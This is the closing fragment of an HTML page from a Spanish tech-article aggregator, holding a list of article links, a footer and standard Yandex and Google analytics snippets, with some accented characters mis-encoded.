<li><a href="../es430292/index.html">Electronic Frontier Foundation: el rendimiento de la red de matr√≠culas de la polic√≠a de los EE. UU. Es del 0,5%</a></li>
<li><a href="../es430294/index.html">10 beneficios obvios de usar Rust</a></li>
<li><a href="../es430296/index.html">Haz que tus ideas se hagan realidad. Aplicaci√≥n sin servidor: instrucciones paso a paso</a></li>
<li><a href="../es430300/index.html">Microservicios en Go con el kit Go: Introducci√≥n</a></li>
<li><a href="../es430304/index.html">Un maravilloso puesto avanzado en √≥rbita</a></li>
<li><a href="../es430306/index.html">El primer t√∫nel de la Compa√±√≠a Aburrida perforado por Ilona Mask</a></li>
<li><a href="../es430308/index.html">Python internos. Huevos de pascua</a></li>
<li><a href="../es430312/index.html">Validaci√≥n de formas complejas de React. Parte 1</a></li>
<li><a href="../es430314/index.html">Otra implementaci√≥n de bot de telegramas o de citas</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>